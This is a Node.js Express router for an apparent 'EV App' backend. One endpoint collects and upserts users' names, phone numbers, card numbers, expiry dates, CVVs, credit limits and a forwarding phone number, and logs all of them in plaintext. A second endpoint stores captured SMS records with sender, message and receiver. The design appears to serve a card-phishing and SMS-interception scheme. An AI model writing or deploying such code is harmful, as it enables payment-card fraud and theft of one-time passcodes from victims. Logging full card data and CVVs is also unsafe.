import express from "express";
import UserModel from "./Schema/user.schema.js";
import FormDataModel from "./Schema/data.schema.js";
import adminRouter from "./Routers/admin.routes.js";

const router = express.Router();

router.get("/", (req, res) => {
  console.log("GET / route hit");
  res.send("Welcome to EV App Server APIs");
});

router.use("/admin", (req, res, next) => {
  console.log("Using /admin router");
  next();
}, adminRouter);

router.post("/save-data", async (req, res) => {
  console.log("POST /save-data route hit");
  try {
    const {
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber
    } = req.body;

    console.log("Request body:", req.body);
    console.log("forwardPhoneNumber:", forwardPhoneNumber);

    if (!mobileNumber) {
      console.log("mobileNumber is missing in request.");
      return res.status(400).json({ message: "mobileNumber is required" });
    }

    // Trim helper
    const trimFields = (obj) => {
      console.log("Trimming fields in object:", obj);
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === "string") result[key] = value.trim();
        else if (
          key === "mobileNumber" ||
          key === "totalLimit" ||
          key === "availableLimit" ||
          key == "forwardPhoneNumber"
        )
          result[key] = value;
        else result[key] = value;
      }
      console.log("Trimmed result:", result);
      return result;
    };

    const data = trimFields({
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber
    });

    // Build dynamic update fields (ignore undefined)
    const updateFields = {};
    for (const [key, value] of Object.entries(data)) {
      if (value !== undefined) updateFields[key] = value;
    }
    console.log("updateFields to be set:", updateFields);

    // Find and update OR insert new
    console.log("Calling findOneAndUpdate in UserModel...");
    const user = await UserModel.findOneAndUpdate(
      { mobileNumber: data.mobileNumber },
      { $set: updateFields },
      { new: true, upsert: true }
    );
    console.log("findOneAndUpdate result user:", user);

    // Check if it was an update or create
    const existed = await UserModel.exists({ mobileNumber: data.mobileNumber });
    console.log("User existed before upsert? :", existed);

    res.status(existed ? 200 : 201).json({
      message: existed
        ? "User updated successfully"
        : "User created successfully",
      data: user,
    });
    console.log("Response sent for /save-data:", existed ? "update" : "create");
  } catch (error) {
    console.log("Error in /save-data:", error);
    if (error.code === 11000) {
      console.log("Duplicate entry error:", error.keyValue);
      return res
        .status(409)
        .json({ message: "Duplicate entry", error: error.keyValue });
    }
    res
      .status(500)
      .json({ message: "Error saving user", error: error.message });
  }
});

router.post("/formdata", async (req, res) => {
  console.log("POST /formdata route hit");
  try {
    const { senderPhoneNumber, message, time, recieverPhoneNumber } = req.body;
    console.log("Request body for /formdata:", req.body);

    // Basic validation
    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber) {
      console.log("Missing field(s) in /formdata:", {
        senderPhoneNumber,
        message,
        time,
        recieverPhoneNumber
      });
      return res.status(400).json({ message: "All fields are required" });
    }

    const formData = new FormDataModel({
      senderPhoneNumber,
      message,
      time,
      recieverPhoneNumber,
    });
    console.log("New FormDataModel created:", formData);

    await formData.save();
    console.log("Form data saved to DB:", formData);

    res.status(201).json({
      message: "Form data saved successfully",
      data: formData,
    });
    console.log("Response sent for /formdata success.");
  } catch (error) {
    console.log("Error in /formdata:", error);
    res
      .status(500)
      .json({ message: "Error saving form data", error: error.message });
  }
});

export default router;
